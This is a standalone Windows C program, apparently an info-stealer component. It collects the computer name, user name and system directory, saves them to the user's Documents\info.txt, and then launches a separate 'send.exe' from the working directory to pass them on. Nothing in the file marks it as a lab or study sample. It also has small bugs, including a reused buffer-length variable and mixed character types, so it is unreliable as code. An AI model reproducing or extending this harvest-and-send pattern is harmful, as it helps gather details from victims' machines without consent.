#include <stdio.h>
#include <Windows.h>
#include <stdlib.h>
#include <direct.h> //getcwd

#define INFO_BUFFER_SIZE 32767
#ifndef _MAX_PATH
#define _MAX_PATH 260
#endif

// @ Author L3ad0xFF

TCHAR comname[INFO_BUFFER_SIZE];
TCHAR username[INFO_BUFFER_SIZE];

DWORD bufCharCount = INFO_BUFFER_SIZE;

int main() {

	FILE *fp;

	char sysdir[MAX_PATH];
	char com_noti[INFO_BUFFER_SIZE] = "Com name : ";
	char usr_noti[INFO_BUFFER_SIZE] = "User name : ";
	char sysdir_noti[INFO_BUFFER_SIZE] = "system path : ";
	char save_path[INFO_BUFFER_SIZE] = "C:\\Users\\";
	char currentpath[_MAX_PATH];
	char run[INFO_BUFFER_SIZE] ="";

	_getcwd(currentpath, _MAX_PATH);

	GetComputerName(comname, &bufCharCount);
	GetUserName(username, &bufCharCount);
	GetSystemDirectory(sysdir, MAX_PATH);

	strcat_s(com_noti, sizeof(com_noti), comname);
	strcat_s(usr_noti, sizeof(usr_noti), username);
	strcat_s(sysdir_noti, sizeof(sysdir_noti), sysdir);
	strcat_s(save_path, sizeof(save_path), username);

	strcat_s(save_path, sizeof(save_path), "\\Documents\\info.txt");

	fopen_s(&fp, save_path, "w");

	fwrite(com_noti, strlen(com_noti), 1, fp);
	fwrite("\n", strlen("\n"), 1, fp);
	fwrite(usr_noti, strlen(usr_noti), 1, fp);
	fwrite("\n", strlen("\n"), 1, fp);
	fwrite(sysdir_noti, strlen(sysdir_noti), 1, fp);
	fclose(fp);

	strcat_s(run, sizeof(run), currentpath);
	strcat_s(run, sizeof(run), "\\send.exe");
	system(run);
	//printf_s("%s\n", run);
	printf_s("\n");
	system("pause");

	return 0;
}